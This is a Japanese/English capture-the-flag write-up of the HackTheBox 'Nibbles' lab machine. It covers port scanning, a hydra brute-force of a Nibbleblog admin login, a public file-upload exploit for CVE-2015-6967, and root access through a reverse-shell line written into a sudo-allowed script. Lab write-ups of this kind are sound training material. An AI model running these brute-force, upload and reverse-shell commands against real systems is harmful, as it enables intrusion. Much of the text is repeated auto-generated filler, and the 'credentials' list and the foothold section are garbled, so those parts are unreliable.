---
title: "HackTheBox - Nibbles 解説 (Linux)"
date: 2026-02-27
description: "HackTheBox Nibbles Linux writeup マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce]
mermaid: true
content_lang: ja
alt_en: /posts/htb-nibbles/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 22/tcp (ssh), 80/tcp (http) |
| 主な侵入経路 | Public exploit path involving CVE-2015-6967 |
| 権限昇格経路 | Credentialed access -> sudo policy abuse -> elevated shell |

## 偵察

- nmap
- feroxbuster
- hydra
- ceWL
- Metasploit
- sudo -l -l
- unzip
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
❌[23:42][CPU:10][MEM:50][TUN0:10.10.14.82][/home/n0z0]
🐉 > grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \       
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 23:42 JST
Warning: 10.129.117.235 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.117.235
Host is up (0.26s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp    open     http         Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
4665/tcp  filtered contclientms
12129/tcp filtered unknown
19489/tcp filtered unknown
20011/tcp filtered unknown
21385/tcp filtered unknown
23497/tcp filtered unknown
25037/tcp filtered unknown
39024/tcp filtered unknown
48897/tcp filtered unknown
54499/tcp filtered unknown
55424/tcp filtered unknown
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   306.64 ms 10.10.14.1
2   306.84 ms 10.129.117.235

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 902.07 seconds

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
nuclei -u http://$ip -as -stats
```

```bash
✅[0:39][CPU:17][MEM:48][TUN0:10.10.14.163][/home/n0z0]
🐉 > nuclei -u http://$ip -as -stats

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.6

		projectdiscovery.io

[INF] Your current nuclei-templates v10.2.8 are outdated. Latest is v10.2.9
[INF] Successfully updated nuclei-templates (v10.2.9) to /home/n0z0/.local/nuclei-templates. GoodLuck!

Nuclei Templates v10.2.9 Changelog
+-------+-------+----------+---------+
| TOTAL | ADDED | MODIFIED | REMOVED |
+-------+-------+----------+---------+
|  3658 |   186 |     3472 |       0 |
+-------+-------+----------+---------+
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.6 (outdated)
[INF] Current nuclei-templates version: v10.2.9 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 182
[INF] Templates loaded for current scan: 8511
[INF] Executing 8309 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Automatic scan tech-detect: Templates clustered: 480 (Reduced 453 Requests)
[INF] Executing Automatic scan on 1 target[s]
[0:00:05] | Templates: 0 | Hosts: 1 | RPS: 31 | Matched: 0 | Errors: 15 | Requests: 167/167 (100%)
[0:00:10] | Templates: 0 | Hosts: 1 | RPS: 18 | Matched: 0 | Errors: 15 | Requests: 193/193 (100%)
[0:00:15] | Templates: 0 | Hosts: 1 | RPS: 23 | Matched: 0 | Errors: 17 | Requests: 353/353 (100%)
[apache-detect] [http] [info] http://10.129.96.84 ["Apache/2.4.18 (Ubuntu)"]
[0:00:20] | Templates: 0 | Hosts: 1 | RPS: 29 | Matched: 1 | Errors: 17 | Requests: 600/600 (100%)
[0:00:25] | Templates: 0 | Hosts: 1 | RPS: 33 | Matched: 1 | Errors: 17 | Requests: 845/845 (100%)
[0:00:30] | Templates: 0 | Hosts: 1 | RPS: 38 | Matched: 1 | Errors: 17 | Requests: 1176/1176 (100%)
[waf-detect:apachegeneric] [http] [info] http://10.129.96.84
[0:00:35] | Templates: 0 | Hosts: 1 | RPS: 40 | Matched: 2 | Errors: 19 | Requests: 1445/1445 (100%)
[0:00:40] | Templates: 0 | Hosts: 1 | RPS: 39 | Matched: 2 | Errors: 19 | Requests: 1584/1584 (100%)
[0:00:45] | Templates: 0 | Hosts: 1 | RPS: 36 | Matched: 2 | Errors: 19 | Requests: 1644/1644 (100%)
[openssh-detect] [tcp] [info] 10.129.96.84:22 ["SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2"]
[INF] Found 8 tags and 3 matches on detection templates on http://10.129.96.84 [wappalyzer: 4, detection: 6]
[INF] Executing 842 templates on http://10.129.96.84
[INF] Using Interactsh Server: oast.fun
[0:00:50] | Templates: 0 | Hosts: 1 | RPS: 36 | Matched: 3 | Errors: 143 | Requests: 1858/1858 (100%)
[0:00:55] | Templates: 0 | Hosts: 1 | RPS: 39 | Matched: 3 | Errors: 143 | Requests: 2173/2173 (100%)
[0:01:00] | Templates: 0 | Hosts: 1 | RPS: 44 | Matched: 3 | Errors: 145 | Requests: 2687/2687 (100%)
[0:01:05] | Templates: 0 | Hosts: 1 | RPS: 44 | Matched: 3 | Errors: 145 | Requests: 2922/2922 (100%)
[apache-detect] [http] [info] http://10.129.96.84 ["Apache/2.4.18 (Ubuntu)"]
[0:01:10] | Templates: 0 | Hosts: 1 | RPS: 45 | Matched: 4 | Errors: 147 | Requests: 3165/3165 (100%)
[openssh-detect] [tcp] [info] 10.129.96.84:22 ["SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2"]
[0:01:15] | Templates: 0 | Hosts: 1 | RPS: 46 | Matched: 5 | Errors: 282 | Requests: 3522/3522 (100%)
[0:01:20] | Templates: 0 | Hosts: 1 | RPS: 43 | Matched: 5 | Errors: 282 | Requests: 3523/3523 (100%)
[0:01:21] | Templates: 0 | Hosts: 1 | RPS: 43 | Matched: 5 | Errors: 282 | Requests: 3523/3523 (100%)
[INF] Scan completed in 1m. 5 matches found.
[0:01:21] | Templates: 0 | Hosts: 1 | RPS: 43 | Matched: 5 | Errors: 282 | Requests: 3523/3523 (100%)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
whatweb -a 3 -v --colour=always http://$ip
```

```bash
✅[0:42][CPU:22][MEM:46][TUN0:10.10.14.163][/home/n0z0]
🐉 > whatweb -a 3 -v --colour=always http://$ip
WhatWeb report for http://10.129.96.84
Status    : 200 OK
Title     : <None>
IP        : 10.129.96.84
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.18 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Wed, 24 Sep 2025 15:43:16 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
	ETag: "5d-5616c3cf7fa77-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 96
	Connection: close
	Content-Type: text/html

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
<users>

<user username="admin">

<id type="integer">0</id>

<session_fail_count type="integer">0</session_fail_count>

<session_date type="integer">1514544131</session_date>

</user>

<blacklist type="string" ip="10.10.10.1">

<date type="integer">1512964659</date>

<fail_count type="integer">1</fail_count>

</blacklist>

<blacklist type="string" ip="10.10.14.163">

<date type="integer">1758728862</date>

<fail_count type="integer">1</fail_count>

</blacklist>

</users>
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
http://10.129.96.84/nibbleblog/content/public/upload/
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
cewl http://$ip/nibbleblog/ -w cewl-wordlist.txt --lowercase
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
hydra -l admin -P ~/work/htb/Nibbles/cewl-wordlist.txt 10.129.109.113 http-post-form \
"/nibbleblog/admin.php:username=^USER^&password=^PASS^&remember=1&submit=Login:Incorrect username or password." \
-V -t 16 -f
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
[80][http-post-form] host: 10.129.109.113   login: admin   password: nibbles
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
Name                                       Disclosure Date  Rank       Check  Description
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

```

`set password nibbles`
`set rhosts 10.10.10.75`
`set targeturi /nibbleblog`
`set username admin`
`set lhost 10.10.14.4`
`options`
💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

No explicit foothold steps were recorded in this source file.

### CVE Notes

- **CVE-2015-6967**: A known vulnerability referenced in this chain and used as part of exploitation.

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

`sudo -l -l`
This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
	/home/nibbler/personal/stuff/monitor.sh
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
-rwxrwxrwx 1 nibbler nibbler 61 Sep 28 05:26 /home/nibbler/personal/stuff/monitor.sh
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#! /bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash -i >& /dev/tcp/10.10.14.163/4443 0>&1' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
rlwrap -cAri nc -lvnp 4443
```

```bash
❌[18:21][CPU:0][MEM:52][TUN0:10.10.14.163][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.14.163] from (UNKNOWN) [10.129.109.113] 56826
root@Nibbles:/home/nibbler/personal/stuff# 
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat root.txt
exit
```

```bash
root@Nibbles:~# cat root.txt
ef39090cb8dd1efc82e96c8296a58177
root@Nibbles:~# exit

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
python3 nibbleblog_4.0.3.py -t http://10.129.109.113/nibbleblog/admin.php -u admin -p nibbles -shell
```

```bash
✅[18:43][CPU:3][MEM:50][TUN0:10.10.14.163][.../Nibbles/nibbleblog_4.0.3]
🐉 > python3 nibbleblog_4.0.3.py -t http://10.129.109.113/nibbleblog/admin.php -u admin -p nibbles -shell
Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution
Loggin in to http://10.129.109.113/nibbleblog/admin.php
Logged in and was able to upload exploit!
Payload located in http://10.129.109.113/nibbleblog/content/private/plugins/my_image/rse.php
RCE: ls -la
total 16
drwxr-xr-x 2 nibbler nibbler 4096 Sep 28 05:43 .
drwxr-xr-x 7 nibbler nibbler 4096 Dec 10  2017 ..
-rw-r--r-- 1 nibbler nibbler  258 Sep 28 05:43 db.xml
-rw-r--r-- 1 nibbler nibbler   39 Sep 28 05:43 rse.php
-rw-r--r-- 1 nibbler nibbler   39 Sep 28 05:43 rse.php

```

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `qiita.com/chelly-egoist19940412/items/d7833110db0cdf4f8392`
- `Tool / Command`
- `home/n0z0]`
- `HOME/work/scans/$(date`
- `22/tcp`
- `80/tcp`
- `text/html).`
- `Apache/2.4.18`
- `4665/tcp`
- `12129/tcp`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2015-6967: https://nvd.nist.gov/vuln/detail/CVE-2015-6967
